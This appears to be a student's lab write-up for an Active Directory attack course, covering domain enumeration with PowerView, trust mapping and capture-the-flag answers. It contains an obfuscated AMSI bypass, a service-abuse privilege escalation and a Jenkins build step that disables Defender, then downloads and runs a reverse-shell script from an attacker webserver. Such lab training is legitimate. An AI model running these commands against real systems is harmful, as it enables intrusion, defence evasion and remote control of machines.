Enumeration


# PowerShell 1337 Color Mode:

```
$host.UI.RawUI.ForegroundColor = "DarkGreen"
$host.UI.RawUI.BackgroundColor = "Black"
```

# Bypass AMSI:

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

# **Learning Objective 1:**
- Enumeratate following for the dollarcorp domain:
    - Users
    - Computers
    - Domain Administrators
    - Enterprise Administrators
    - Shares

* * *


# Enumerate Users:

```
powershell -ep bypass
. .\PowerView.ps1
Get-NetUser
```

- List specicific property of all the users e.g. samaccountname:

```
Get-NetUser | select -ExpandProperty samaccountname
```

![c895b4c7f4475ff15ceb1feb606a86f9.png](../../_resources/95ccbd0922aa4ca88f7cdd37cb10b5b0.png)

# Enumerate Computers:

```
Get-NetComputer
```

![c451cf9b53907a4907be67e0e070606a.png](../../_resources/7ebed3daadae40aa85feead54996fc57.png)

- Get IPs of Computers in subnet using ADModule

```
 Get-ADcomputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

![aff43b3644461ff81f62d8ae949e81e4.png](../../_resources/2683f60a49864eef8ae406a6b4a9f63f.png)

# Enumerate Domain Admins
- See Attributes of the Domain Admins Group:

```
Get-NetGroup -GroupName "Domain Admins" -FullData
```

![0de7d06a7bc303e0de3154721f98d9b1.png](../../_resources/1f7ab023874d48ddb706d646b27b1c24.png)

- Get Members of the Domain Admins group:

```
Get-NetGroupMember -GroupName "Domain Admins"
```

![7bfdd714ae1e912cb1f12f0743f4a304.png](../../_resources/d92fbfecd42f495e837f7ea1e61397b5.png)

# Enumerate Enterprise Admins
- Get Members of the Enterprise Admins Group:

```
# Have to query the the root domain because Enterprise Admins group is only present in the root of a forest

Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local
```

![25352af77252e8f3a84cd1334f27d65d.png](../../_resources/3e53e949f3b94cf8a6f4aef7089748d9.png)

* * *

# **Flag 1:**

- SID of the member of the Enterprise Admins group

![127e1fec035109844a6691a7d05adf70.png](../../_resources/3ab159dfdb3e4cb2a1854dbdc0b05c39.png)
---

# Find interesting shares
```
Invoke-ShareFinder -Exclude Standard -ExcludePrint -ExcludeIPC -Verbose
```
![7fe7ffdc5ed9519f62ee7c29eafc2e61.png](../../_resources/f0aed46b7a6a438c9a51e40e310adc20.png)

---
# **Learning Objective 2:** 
- Enumerate following of dollarcorp domain:
	- List all the OUs
	- List all the computers in the StudentMachines OU.
	- List the GPOs
	- Enumerate GPO applied on the StudentMachines OU
***
- Enumerate Restricted Groups from GPO:
```
Get-NetGPOGroup -Verbose
```
- Look for membership of the group "RDPUsers"
```
Get-NetGroupMember -GroupName RDPUsers

#PowerView Dev
Get-NetGroupMember RDPusers
```
![a78ee6cf544efc91a5980f3c4fc6e221.png](../../_resources/2c16235003bb44369ab6b7d953a53000.png)

# List all the OUs
```
Get-NetOU
```
![2ce29e33016f137f1ee0a7be8a016716.png](../../_resources/fca09c313ce34045aeb531c5a0a300ce.png)

# List all Computers in StudentMachines OU:
```
# PowerView
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```
![ec819538b9704f71803a520d9d0fcd30.png](../../_resources/cfa30bb61c8b4f3db25c8d8b2fee4b78.png)

# List the GPOs:
```
Get-NetGPO
```
![6c9c07011d65aba9704439497dd54114.png](../../_resources/b66ce75327534324ad815c25c59237b5.png)

# Enumerate GPO applied to StudentMachines OU:
```
# PowerView
(Get-NetOU StudentMachines -FullData).gplink
# PowerView Dev
(Get-NetOU StudentMachines).gplink
```
![a6313cc465384179c84195798fe80565.png](../../_resources/5a0db634c45c424f8ad8a7677cbf5065.png)
```
Get-NetGPO -ADSPath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
```

![06adcdbb1b1dde1b1b4a8461fc73efa3.png](../../_resources/d8345323ff3e4f88a0d595603081f4ad.png)

---
# **FLAG 2**:

- Display name of the GPO applied on StudentMachines OU

![2e52f21585c191a837a768756acf1767.png](../../_resources/c6c2babc6a8a451fa3ea2d663efa55f3.png)

---
# **Learning Objective 3:** 
- Enumerate the following:
	- ACL for the Users group
	- ACL for the Domain admins group
	- All modify/rights/permissions for the student537
---
# ACL for the Users group:
```
Get-ObjectAcl -SamAccountName "Users" -ResolveGUIDs -Verbose
```
# ACL for the Domain Admins group:
```
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
```
- nothing out of the ordinary in lab here.
# ACLs for all of the GPOs:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```
# GPOs where student537 or RDPUsers group have interesting permissions:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "student"}
```
- nothing interesting in lab here.
# Check All Modify rights/perms for the student537 or RDPUsers group:
- use the old PowerView for this to work.
```
Invoke-ACLScanner -ResolveGUIDs |?{$_.IdentityReference -match "student"}
```
```
Invoke-ACLScanner -ResolveGUIs | ?{$_.IdentityReference -match "RDPUsers"}
```
# **FLAG 3:**
- ActiveDirectory Rights for RDPUsers group on the users named Control537User

![f97bf4b346607b8a9c4a0bd21e6e1e83.png](../../_resources/ae1f4035e8014392954a1d6a7f2f2b84.png)

***
# Learning Objective 4:
- Enumerate all domains in the moneycorp.local forest
- Map the trusts of the dollarcorp.moneycorp.local domain
- Map External trusts in moneycorp.local forest
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
***
# Enumerate all domains:
```
Get-NetForestDomain -Verbose
```
![3c8d2bd10db07da0b37073eb1582a969.png](../../_resources/2b387f45d9b345b6b26c288ef28e3b20.png)

# Map the trusts of the dollarcorp domain:
```
Get-NetDomainTrust -NET
```
![1b45bfaa586fb83454937fc90bcb2f7f.png](../../_resources/5362bfb5a22d480e9e1c0a0d464bb97c.png)
![a2268137be1fcbac0e2875e40067c392.png](../../_resources/74154425b27f4dfb9a4a42dcad1454da.png)

# Map all the trusts of the moneycorp.local forest:
```
Get-NetForestDomain | Get-NetDomainTrust -NET
```
![33c9906396943a07ceee7e0b70abc440.png](../../_resources/c3a210451d324683abc829eec33a6f53.png)

# Get only the external trusts:
```
Get-NetForestDomain | Get-NetDomainTrust -NET | ?{$_.TrustType -eq 'External'}
```
![2b72d26e2ebc747315c74d669753f350.png](../../_resources/4193c570b4b24e719b5ab62203f9b49a.png)

# Identify external trusts of the dollarcorp.local domain
```
Get-NetDomainTrust -NET | ?{$_.TrustType -eq 'External'}
```
![fc8aebe7d7085b4d2bd3262c3cd79410.png](../../_resources/ac2d74c6e18c47c4ab326d897cea1254.png)

# Extract info from the external forest:
- Its Bi-directional so we can enumerate the external trust
```
Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust -NET
```
![e57a1bfde5c7e103e3dde806745042f7.png](../../_resources/2ab2e7bfb373484884009d444a59be0f.png)

***
# **FLAG 4:** Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
- `BiDirectional`
***

# **Learning Objective 5:**
- Exploit a service on dcorp-student537 and elevate privileges to local administrator
- Identify a machine in the domain where student537 has local administrative access.
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 which is the dcorp-ci server.
***
# First enumerate all the services with Unquoted Path with PowerUp
```
. .\PowerUp.ps1
Get-ServiceUnquoted
```
![cf3c3c998505e538f4f03c757a67c19c.png](../../_resources/6c28d2ca67e04ea69401c9e6845f11a0.png)

# Enumerate which services allow the current user to make changes to the service binary:
```
Get-ModifiableServiceFile -Verbose
```
![4d307d8415fdc9fedd3fffbf37c8eb64.png](../../_resources/7c7f2d761eff431bab247f6f0561fb5c.png)

# Enumerate services with weak service permissions:
```
Get-ModifiableService -Verbose
```

![b6cb95cd93004a6814e4aa72cd4e4a12.png](../../_resources/0a0abfcb5386464882a7afca930834bb.png)

![f17fd8b0852dc3c4eb904137bcfcd965.png](../../_resources/8620b51448934f3c995482cef612e8d2.png)

# Abuse function for Get-ModifiableService and add our current domain user to the local administrators group:
```
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName 'dcorp\student537'
```

![d4db023d2fed2d21c2f25b5b61e74049.png](../../_resources/18a74f22dc4d46e6a539a8d03ac6c017.png)
- Log off and log on again with Local Admin privs!!
***
# **FLAG 5:** Service abused on the student VM for local priv esc:
- AbyssWebServer and/or SMTPTRAP
***

# Find a machine in the domain where we also have local admin rights:
```
Find-LocalAdminAccess -Verbose
```

![fc7fd6fa034eff0b0b420f41735ccce9.png](../../_resources/1b53f071bcd04508adf2ad362240b11d.png)

# **FLAG 6:** Script Used for hunting admin privs using PSRemoting
- or use `Find-PSRemotingLocalAdminAccess.ps1` because if we can connect via PSRemoting then we have admin privs on it.

![ff7ca9e975e417fcd17407fbeaf925fb.png](../../_resources/d9334f761053495697b82b94d72edc80.png)
- so we have local admin access on `dcorp-adminsrv.dollarcorp.moneycorp.local`
- confim by running a PS Remoting session on it.
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```
![08fdb504a7aa7b3842efb89e8f3b3c66.png](../../_resources/59f4278f7c8c4214a2323ddee7bf5ca7.png)

# Jenkins Exploitation:
1.	Edit Invoke-PowerShellTcp.ps1 to include a function call at the bottom of script with what you where you would like the shell to go. Make sure the functions call matched whatever it is declared as in the beginning of the script.

![ce1df797182a562799724684b5f401a6.png](../../_resources/7170f3068e9d467fbf06465d46c894b9.png)

2.	Pick a project to play with…and add Build Steps with the Execute Windows batch command option….disable the protections and then grab your script from the webserver that you are hosting it on. Save your changes.
a.	Powershell -ep bypass
b.	Powershell Set-MpPreference -DisableRealtimeMonitoring $true
c.	Powershell Set-MpPreference -DisableIOAVProtection $true
d.	Powershell iex (iwr http://172.16.x.x/Invoke-PowerShellTcp.ps1 -UseBasicParsing)

![5271e97c057a0379498c84536edbf822.png](../../_resources/cabb0c5a33a84b4a9524fe81b0134b7e.png)
3.	Spin up your webserver and a listener. Powercat -l -v -p 53 -t 1000; In linux using rlwrap with netcat will work. 

![30d8fa32713391c2813b91d4f551864a.png](../../_resources/9b6e8249c8d8457ab5a8739f9ccda2b5.png)
![3b7117b78e82c2828fbb3a5ce2d70a54.png](../../_resources/2358e2c457724f5997676af6ef579d04.png)
4.	Build the project with “Build Now” in Jenkins and win.  
![b2bdb6535c80b54e297e13f5ef908cfe.png](../../_resources/a0e292a56f0d432f82bfe78b3c2aaf82.png)

![18701c98ff5d21866fdf5be486eca708.png](../../_resources/160011f8080d45188f523e0265c95609.png)

Note: If things go wonky or its not hitting your webserver and/or not executing…its useful to check out the Console log in Jenkins to see where things blew up. You can click on the down arrow next to the build number to select it. For example, below is the output after I fatfingered the command.

![5ecbaae5e321b7931a17be9b4114c7a1.png](../../_resources/08bd1a0d617c4739b5783d455e7e2117.png)
***
# **FLAG 7:** Jenkins user to access Jenkins webconsole
- builduser:builduser
***
# **FLAG 8:** Domain user used for running Jenkins service on dcorp-ci
- ciadmin

















